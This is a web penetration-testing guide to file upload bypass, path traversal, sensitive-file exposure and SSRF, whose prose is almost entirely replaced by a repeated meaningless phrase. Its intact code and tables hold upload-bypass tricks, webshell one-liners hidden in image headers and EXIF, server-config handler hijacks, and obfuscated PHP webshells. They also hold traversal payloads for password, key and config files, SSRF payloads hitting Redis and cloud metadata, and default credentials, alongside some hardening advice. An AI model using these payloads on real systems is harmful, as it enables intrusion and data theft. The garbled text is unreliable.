# Webfile security testing guidance

> **file security testing guidance**: file security testing guidanceWooYunfile security testing guidance88,636file security testing guidance，file security testing guidance(2,711file security testing guidance)、file security testing guidance/file security testing guidance(50file security testing guidance)、file security testing guidance(7,337file security testing guidance)file security testing guidance。
> **file security testing guidance**: WooYunfile security testing guidance + INTJfile security testing guidance

---

## file security testing guidance、file security testing guidance

### 1.1 file security testing guidance

```
file security testing guidance: file security testing guidance → file security testing guidance → file security testing guidance → file security testing guidance → Webshellfile security testing guidance
file security testing guidance = P(file security testing guidance) × P(file security testing guidance) × P(file security testing guidance)
```

file security testing guidance: file security testing guidance(file security testing guidance) vs file security testing guidance(file security testing guidance)。file security testing guidance"file security testing guidance"，file security testing guidance。

### 1.2 file security testing guidance

| file security testing guidance | file security testing guidance | file security testing guidance | file security testing guidance |
|-----------|------|------|---------|
| file security testing guidance | 42% | file security testing guidance | `/fckeditor/`, `/ewebeditor/`, `/ueditor/` |
| file security testing guidance | 18% | file security testing guidance | `/upload/avatar/`, `/member/uploadfile/` |
| file security testing guidance/file security testing guidance | 15% | file security testing guidance | `/uploads/`, `/attachment/` |
| file security testing guidance | 12% | file security testing guidance | `/admin/upload/`, `/system/upload/` |
| file security testing guidance | 5% | file security testing guidance | `/import/`, `/excelUpload/` |

file security testing guidance:

| file security testing guidance | file security testing guidance | file security testing guidance |
|-------|---------|---------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` | `/connectors/jsp/connector` |
| eWebEditor | `/ewebeditor/admin/default.jsp` | `/uploadfile/` |
| UEditor | `/ueditor/controller.jsp action=config` | `/ueditor/controller.jsp` |

### 1.3 file security testing guidance - file security testing guidance

file security testing guidance:

| file security testing guidance | PHP | ASP/ASPX | JSP |
|-----|-----|----------|-----|
| file security testing guidance | `.Php .pHp` | `.Asp .aSp` | `.Jsp .jSp` |
| file security testing guidance | `.pphphp` | `.asaspp` | `.jsjspp` |
| file security testing guidance | `.php3 .php5 .phtml .phar` | `.asa .cer .cdx` | `.jspx .jspa` |
| file security testing guidance/file security testing guidance | `.php .` | `.asp.` | `.jsp.` |
| ::$DATA | N/A | `.asp::$DATA` | N/A |
| %00file security testing guidance | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
| file security testing guidance(IIS) | N/A | `.asp;.jpg` | N/A |
| file security testing guidance(Apache) | `.php\x0a` | N/A | N/A |

file security testing guidance:

| file security testing guidance | file security testing guidance | file security testing guidance |
|-----|------|------|
| file security testing guidance | file security testing guidance | IIS/Apache/Nginxfile security testing guidance |
| Apachefile security testing guidance | `shell.php.jpg` file security testing guidancephp | Apachefile security testing guidance |
| %00file security testing guidance | `shell.php%00.jpg` | PHP < 5.3.4 |
| file security testing guidance | file security testing guidance`.htaccess`/`.user.ini` | file security testing guidancetxt/file security testing guidance |
| file security testing guidance+LFI | file security testing guidance | file security testing guidanceLFIfile security testing guidance |

### 1.4 file security testing guidance - MIME/Content-Type

```
file security testing guidanceContent-Typefile security testing guidance:
image/jpeg | image/gif | image/png | image/bmp
application/octet-stream (file security testing guidance)

Burpfile security testing guidance:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <-- file security testing guidance
```

### 1.5 file security testing guidance - file security testing guidance/file security testing guidance

file security testing guidanceMagic Number:

| file security testing guidance | Magic Number(Hex) | ASCII |
|-----|-------------------|-------|
| JPEG | `FF D8 FF` | file security testing guidanceASCII |
| PNG | `89 50 4E 47` | .PNG |
| GIF | `47 49 46 38` | GIF8 |
| BMP | `42 4D` | BM |
| PDF | `25 50 44 46` | %PDF |
| ZIP | `50 4B 03 04` | PK.. |

file security testing guidance:

```bash
# file security testing guidance1: file security testing guidance
GIF89a< php system($_POST['cmd']);  >

# file security testing guidance2: file security testing guidance
copy /b image.gif+shell.php shell.gif      # Windows
cat image.gif shell.php > shell.gif         # Linux

# file security testing guidance3: EXIFfile security testing guidance
exiftool -Comment='< php system($_GET["cmd"]);  >' image.jpg
```

### 1.6 Webfile security testing guidance

```
IIS 5.x/6.0:
  file security testing guidance: /shell.asp/1.jpg     -> file security testing guidanceASP
  file security testing guidance: shell.asp;.jpg       -> file security testing guidanceASP
  file security testing guidance: shell.asp.jpg        -> file security testing guidanceASP

Apache:
  file security testing guidance: shell.php.xxx          -> file security testing guidance
  .htaccess: AddType application/x-httpd-php .jpg
  file security testing guidance: shell.php%0a         -> CVE-2017-15715

Nginx:
  file security testing guidance: /1.jpg/shell.php     -> cgi.fix_pathinfo=1
  file security testing guidance: shell.jpg%00.php       -> file security testing guidance

Tomcat:
  PUTfile security testing guidance: PUT /shell.jsp/       -> CVE-2017-12615
```

### 1.7 file security testing guidance

```apache
# .htaccess: file security testing guidancejpgfile security testing guidancePHP
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

```ini
# .user.ini (PHP-FPM): file security testing guidance
auto_prepend_file=/var/www/html/uploads/shell.jpg
```

```xml
<!-- web.config (IIS): file security testing guidancejpgfile security testing guidanceFastCGIfile security testing guidance -->
<handlers>
  <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
       scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
</handlers>
```

### 1.8 file security testing guidance

```
file security testing guidance: file security testing guidance
file security testing guidance: file security testing guidance+file security testing guidance,file security testing guidance
file security testing guidance: file security testing guidance,file security testing guidance
```

### 1.9 file security testing guidance

1. file security testing guidance: file security testing guidance(`.jpg .png .gif .pdf`)
2. file security testing guidance: file security testing guidance + MIME(finfo_file) + file security testing guidance + getimagesize()
3. file security testing guidance: `uniqid() + file security testing guidance`，file security testing guidance
4. file security testing guidance: file security testing guidance
5. file security testing guidance: `chmod 0644`，Webfile security testing guidance
6. file security testing guidance: file security testing guidance，file security testing guidance
7. file security testing guidance: file security testing guidance，file security testing guidanceCDNfile security testing guidanceURL

---

## file security testing guidance、file security testing guidance

### 2.1 file security testing guidance

```
file security testing guidance -> [file security testing guidance] -> file security testing guidance
file security testing guidance: file security testing guidance"file security testing guidance=file security testing guidance"，file security testing guidance"file security testing guidance=file security testing guidance"
```

### 2.2 file security testing guidance

file security testing guidance(file security testing guidance):

```
file security testing guidance: filename, filepath, path, file, filePath, hdfile, inputFile
file security testing guidance: download, down, attachment, attach, doc
file security testing guidance: read, load, get, fetch, open, input
file security testing guidance: template, tpl, page, include, temp
file security testing guidance: url, src, dir, folder, resource, name
```

file security testing guidance(TOP 5):
1. file security testing guidance (27file security testing guidance) - `down.php, download.jsp`
2. file security testing guidance (17file security testing guidance) - `view.php, preview.jsp`
3. file security testing guidance (6file security testing guidance) - `attachment.php`
4. file security testing guidance (5file security testing guidance) - `pic.php, image.jsp`
5. file security testing guidance (4file security testing guidance) - `log.php, viewlog.jsp`

### 2.3 file security testing guidancePayload

file security testing guidance:

```bash
../                          # Linuxfile security testing guidance
..\..\                       # Windowsfile security testing guidance
../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
```

file security testing guidance:

```bash
# URLfile security testing guidance
%2e%2e%2f  |  %2e%2e%5c  |  ..%2f  |  %2e%2e/

# URLfile security testing guidance
%252e%252e%252f  |  ..%252f

# Unicode/UTF-8file security testing guidance (GlassFishfile security testing guidance)
%c0%ae%c0%ae/%c0%af

# file security testing guidance
..%2f  |  %2e%2e/  |  ..%c0%af
```

file security testing guidance:

```bash
# file security testing guidance (PHP<5.3.4 / Javafile security testing guidance)
../../../etc/passwd%00.jpg

# file security testing guidance
../../../WEB-INF/web.xml%3f

# file security testing guidance
....//  |  ....\/  |  ..\/  |  ./../../

# file security testing guidance/file security testing guidance
/etc/passwd
file:///etc/passwd
file://localhost/etc/passwd
```

### 2.4 file security testing guidance

Linuxfile security testing guidance:

```bash
/etc/passwd                    # file security testing guidance(file security testing guidance)
/etc/shadow                    # file security testing guidance
/etc/hosts                     # file security testing guidance
/root/.ssh/id_rsa              # SSHfile security testing guidance
/root/.bash_history            # file security testing guidance
/proc/self/environ             # file security testing guidance
/etc/nginx/nginx.conf          # Nginxfile security testing guidance
/etc/my.cnf                    # MySQLfile security testing guidance
```

Windowsfile security testing guidance:

```bash
C:\windows\win.ini             # file security testing guidance(file security testing guidance)
C:\boot.ini                    # file security testing guidance(XP/2003)
C:\inetpub\wwwroot\web.config  # IISfile security testing guidance
C:\windows\system32\config\sam # SAMfile security testing guidance
```

Java Web:

```bash
WEB-INF/web.xml                         # file security testing guidance(file security testing guidance)
WEB-INF/classes/jdbc.properties          # file security testing guidance
WEB-INF/classes/applicationContext.xml   # Springfile security testing guidance
WEB-INF/classes/hibernate.cfg.xml        # Hibernatefile security testing guidance
```

PHPfile security testing guidance:

```bash
config.php | config.inc.php | db.php | conn.php    # file security testing guidance
wp-config.php                           # WordPress
config_global.php | config_ucenter.php  # Discuz
application/config/database.php         # CodeIgniter
```

ASP.NET:

```bash
web.config                 # file security testing guidance(file security testing guidance)
../web.config              # file security testing guidance
```

### 2.5 file security testing guidance

```python
import os
def safe_file_access(user_input, base_dir):
    # 1. file security testing guidance
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    # 2. file security testing guidance
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise SecurityError("Path traversal detected")
    # 3. file security testing guidance
    # 4. file security testing guidance
    return full_path
```

file security testing guidance: file security testing guidance(realpath/normpath) -> file security testing guidance -> file security testing guidance -> file security testing guidance

---

## file security testing guidance、file security testing guidance

### 3.1 file security testing guidance

```
file security testing guidance: file security testing guidance -> file security testing guidance -> file security testing guidance
file security testing guidance: file security testing guidance
      file security testing guidance -> file security testing guidance -> file security testing guidance -> file security testing guidance -> file security testing guidance
```

### 3.2 file security testing guidance

file security testing guidance:

```bash
# Gitfile security testing guidance (file security testing guidance)
/.git/config          # file security testing guidance
/.git/HEAD            # file security testing guidance
/.git/index           # file security testing guidance
/.git/logs/HEAD       # file security testing guidance

# SVNfile security testing guidance
/.svn/entries         # SVN 1.6file security testing guidance
/.svn/wc.db           # SVN 1.7+ SQLitefile security testing guidance

# file security testing guidance: dvcs-ripper, GitHack, svn-extractor
```

file security testing guidance:

```bash
# file security testing guidance (530file security testing guidance)
/wwwroot.rar | /www.zip | /web.rar | /backup.zip | /site.tar.gz
/{domain}.zip | /{domain}.rar

# SQLfile security testing guidance (136file security testing guidance)
/backup.sql | /database.sql | /db.sql | /dump.sql

# file security testing guidance (101file security testing guidance)
/config.php.bak | /web.config.bak | /.env.bak
/config_global.php.bak
```

file security testing guidance:

```bash
# file security testing guidance
/.env | /.env.local | /.env.production
/config.yml | /config.json | /appsettings.json

# PHP
/config.php | /include/config.php | /data/config.php

# Java/Spring
/WEB-INF/web.xml | /WEB-INF/classes/application.properties
/WEB-INF/classes/jdbc.properties

# .NET
/web.config | /connectionStrings.config
```

file security testing guidance/file security testing guidance/file security testing guidance:

```bash
# file security testing guidance
/phpinfo.php | /info.php | /test.php | /probe.php

# file security testing guidance
/ctp.log | /logs/ctp.log | /debug.log | /storage/logs/

# file security testing guidance
/phpmyadmin/ | /pma/ | /adminer.php
/swagger-ui.html | /api-docs
/actuator/env                    # Spring Boot
```

### 3.3 file security testing guidance

```
Phase 1 file security testing guidance: file security testing guidance(Server/X-Powered-By) -> file security testing guidance -> robots.txt -> file security testing guidance/JS
Phase 2 file security testing guidance: file security testing guidance(.git/.svn) -> file security testing guidance(file security testing guidance/file security testing guidance) -> file security testing guidance
Phase 3 file security testing guidance: Google Hackingfile security testing guidance
```

Google Hackingfile security testing guidance:

```
site:target.com filetype:sql | filetype:bak | filetype:zip
site:target.com filetype:env | filetype:log
site:target.com inurl:.git | inurl:.svn
site:target.com inurl:phpinfo | intitle:phpinfo
site:target.com "db_password" | "mysql_connect"
```

### 3.4 file security testing guidance

```
file security testing guidance   -> file security testing guidance -> file security testing guidance -> file security testing guidance -> file security testing guidance
file security testing guidance   -> file security testing guidance -> SQLfile security testing guidance  -> file security testing guidance   -> file security testing guidancegetshell
file security testing guidance   -> DBfile security testing guidance -> file security testing guidance    -> file security testing guidance   -> file security testing guidance
file security testing guidance   -> Session  -> file security testing guidance  -> file security testing guidance   -> file security testing guidance
APIfile security testing guidance    -> file security testing guidance/file security testing guidance -> file security testing guidance     -> file security testing guidance   -> file security testing guidance
file security testing guidance -> file security testing guidance/OSS -> file security testing guidance    -> file security testing guidance   -> file security testing guidance
```

### 3.5 file security testing guidance

Nginxfile security testing guidance:

```nginx
location ~ /\.(git|svn|env|htaccess|htpasswd) { deny all; return 404; }
location ~ \.(bak|sql|log|config|ini|yml)$ { deny all; return 404; }
location ~* /(backup|bak|old|temp|test|dev)/ { deny all; return 404; }
autoindex off;
server_tokens off;
```

Apachefile security testing guidance:

```apache
<FilesMatch "\.(git|svn|env|bak|sql|log|config)">
    Order Allow,Deny
    Deny from all
</FilesMatch>
Options -Indexes
ServerSignature Off
```

CI/CDfile security testing guidance: file security testing guidance -> file security testing guidance.git/.svnfile security testing guidance -> file security testing guidance

---

## file security testing guidance、SSRFfile security testing guidance

### 4.1 file security testing guidance

```
SSRFfile security testing guidance: file security testing guidance,file security testing guidance
file security testing guidance: file security testing guidance -> file security testing guidance -> file security testing guidance -> file security testing guidance
```

### 4.2 file security testing guidance

- file security testing guidanceurlfile security testing guidance
- file security testing guidance/file security testing guidance
- file security testing guidance/file security testing guidance
- file security testing guidanceURLfile security testing guidance
- Webhook/file security testing guidance

### 4.3 file security testing guidance

```bash
# file:// - file security testing guidance
file:///etc/passwd
file:///C:/windows/win.ini

# dict:// - file security testing guidance/file security testing guidance
dict://127.0.0.1:6379/info     # Redis
dict://127.0.0.1:11211/stats   # Memcached

# gopher:// - file security testing guidanceTCPfile security testing guidance
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall

# http:// - file security testing guidance
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/  # file security testing guidance
```

### 4.4 file security testing guidance

```bash
# IPfile security testing guidance
127.0.0.1 -> 0x7f000001 -> 2130706433 -> 017700000001 -> 127.1
# DNSfile security testing guidance: file security testing guidanceIPfile security testing guidance127.0.0.1
# file security testing guidance/302file security testing guidance: file security testing guidanceURLfile security testing guidance
```

### 4.5 file security testing guidance

1. file security testing guidance: file security testing guidance/IP
2. file security testing guidance: file security testing guidancehttp/https
3. file security testing guidance: file security testing guidanceRFC1918file security testing guidance127.0.0.1
4. DNSfile security testing guidance: file security testing guidanceIPfile security testing guidance
5. file security testing guidance: file security testing guidance

---

## file security testing guidance、file security testing guidance

### 5.1 file security testing guidance

| file security testing guidance | file security testing guidance | file security testing guidance |
|-----|------|---------|
| IIS 6.0file security testing guidance | `shell.asp;.jpg`file security testing guidance | file security testing guidance |
| Nginx cgi.fix_pathinfo=1 | `/img.jpg/.php`file security testing guidancePHP | file security testing guidance`/img.jpg/x.php` |
| Apachefile security testing guidance | `shell.php.xxx`file security testing guidance | file security testing guidance |
| file security testing guidance | Webshellfile security testing guidance | file security testing guidance |
| file security testing guidance | file security testing guidance | file security testing guidanceURLfile security testing guidance |

### 5.2 file security testing guidance

| file security testing guidance | file security testing guidance | file security testing guidance |
|-----|------|------|
| Webfile security testing guidance | file security testing guidanceroot | file security testing guidance |
| file security testing guidance777file security testing guidance | file security testing guidance+file security testing guidance | file security testing guidance644/755 |
| file security testing guidance | file security testing guidance | file security testing guidanceWebfile security testing guidance,file security testing guidance |
| file security testing guidanceIPfile security testing guidance | file security testing guidance | IPfile security testing guidance/VPN |

### 5.3 file security testing guidance

```bash
# file security testing guidance
/admin/ | /manager/ | /console/ | /system/
/phpmyadmin/ | /adminer.php

# file security testing guidance (file security testing guidance)
admin/admin | admin/123456 | admin/admin123
root/root | test/test

# file security testing guidance
8080 (Tomcat) | 9090 (file security testing guidance) | 3306 (MySQLfile security testing guidance)
6379 (Redisfile security testing guidance) | 27017 (MongoDBfile security testing guidance)
```

### 5.4 Spring Boot Actuatorfile security testing guidance

```bash
/actuator/env          # file security testing guidance(file security testing guidance)
/actuator/configprops  # file security testing guidance
/actuator/heapdump     # file security testing guidance(file security testing guidance)
/actuator/mappings     # file security testing guidanceURLfile security testing guidance
```

---

## file security testing guidance、file security testing guidanceChecklist

### 6.1 file security testing guidance

- [ ] file security testing guidance(FCKeditor/eWebEditor/UEditor)
- [ ] file security testing guidanceJavaScriptfile security testing guidance
- [ ] file security testing guidance: file security testing guidance/file security testing guidance/file security testing guidance/%00file security testing guidance/file security testing guidance
- [ ] file security testing guidanceContent-Typefile security testing guidanceimage/jpeg
- [ ] file security testing guidanceGIF89afile security testing guidance / file security testing guidance
- [ ] file security testing guidance,file security testing guidance
- [ ] file security testing guidance.htaccess/.user.inifile security testing guidance
- [ ] file security testing guidance,file security testing guidance
- [ ] file security testing guidance

### 6.2 file security testing guidance

- [ ] file security testing guidance(filename/path/file/url/download)
- [ ] file security testing guidance: `../../../../../etc/passwd`
- [ ] Windowsfile security testing guidance: `..\..\..\..\..\windows\win.ini`
- [ ] Java Web: `../WEB-INF/web.xml`
- [ ] URLfile security testing guidance: `%2e%2e%2f` / file security testing guidance `%252e%252e%252f`
- [ ] Unicodefile security testing guidance: `%c0%ae%c0%ae/`
- [ ] file security testing guidance: `../etc/passwd%00.jpg`
- [ ] file security testing guidance: `/etc/passwd` / `file:///etc/passwd`

### 6.3 file security testing guidance

- [ ] file security testing guidance: `/.git/config` `/.svn/entries` `/.svn/wc.db`
- [ ] file security testing guidance: `/wwwroot.rar` `/www.zip` `/backup.sql` `/{domain}.zip`
- [ ] file security testing guidance: `/config.php.bak` `/web.config.bak` `/.env.bak`
- [ ] file security testing guidance: `/.env` `/.env.production`
- [ ] file security testing guidance: `/phpinfo.php` `/info.php` `/test.php`
- [ ] file security testing guidance: `/ctp.log` `/debug.log` `/storage/logs/`
- [ ] file security testing guidance: `/phpmyadmin/` `/adminer.php` `/swagger-ui.html`
- [ ] Spring Boot: `/actuator/env` `/actuator/heapdump`
- [ ] Google Hackingfile security testing guidance

### 6.4 SSRFfile security testing guidance

- [ ] file security testing guidanceURL/file security testing guidance/file security testing guidance
- [ ] file security testing guidancefile:///etc/passwdfile security testing guidance
- [ ] file security testing guidance: http://127.0.0.1:port
- [ ] file security testing guidance: http://169.254.169.254/latest/meta-data/
- [ ] IPfile security testing guidance: file security testing guidance/file security testing guidance/file security testing guidance
- [ ] DNSfile security testing guidance/302file security testing guidance

---

## file security testing guidanceA: file security testing guidanceCMSfile security testing guidance

| CMS/file security testing guidance | file security testing guidance | file security testing guidance | file security testing guidance |
|---------|---------|------|------|
| file security testing guidanceOA ezOffice | file security testing guidance | `/defaultroot/dragpage/upload.jsp` | %00file security testing guidance |
| file security testing guidance | file security testing guidance | `/oaerp/ui/sync/excelUpload.jsp` | file security testing guidanceJS+file security testing guidance |
| file security testing guidanceGSiS | file security testing guidance | `/kdgs/core/upload/upload.jsp` | file security testing guidance |
| file security testing guidanceepstar | file security testing guidance | `/epstar/servlet/RaqFileServer action=open&fileName=/../WEB-INF/web.xml` | file security testing guidance |
| file security testing guidanceOA | file security testing guidance | `/ctp.log` | file security testing guidance |

## file security testing guidanceB: Webshellfile security testing guidance

```php
$a = 'as'.'sert'; $a($_POST['x']);                    // file security testing guidance
array_map('ass'.'ert', array($_POST['x']));            // file security testing guidance
$f = create_function('', $_POST['x']); $f();           // file security testing guidance
set_exception_handler('system');                        // file security testing guidance
throw new Exception($_POST['cmd']);
```

## file security testing guidanceC: file security testing guidanceURLfile security testing guidance

```bash
# PHPfile security testing guidance
/down.php filename=../../../etc/passwd
/pic.php url=[base64file security testing guidance]

# JSPfile security testing guidance
/download.jsp path=../WEB-INF/web.xml
/servlet/RaqFileServer action=open&fileName=/../WEB-INF/web.xml

# ASP/ASPXfile security testing guidance
/DownLoad.aspx Accessory=../web.config
/download.ashx file=../../../web.config

# Resinfile security testing guidance
/resin-doc/resource/tutorial/jndi-appconfig/test inputFile=/etc/passwd
```

---

> **file security testing guidance/file security testing guidance/file security testing guidanceCVE** → file security testing guidance [web-deployment-security.md](web-deployment-security.md)
> **CORS/GraphQL/HTTPfile security testing guidance/WebSocket/OAuth** → file security testing guidance [web-modern-protocols.md](web-modern-protocols.md)

*file security testing guidanceWooYunfile security testing guidance(88,636file security testing guidance)file security testing guidance | file security testing guidance*
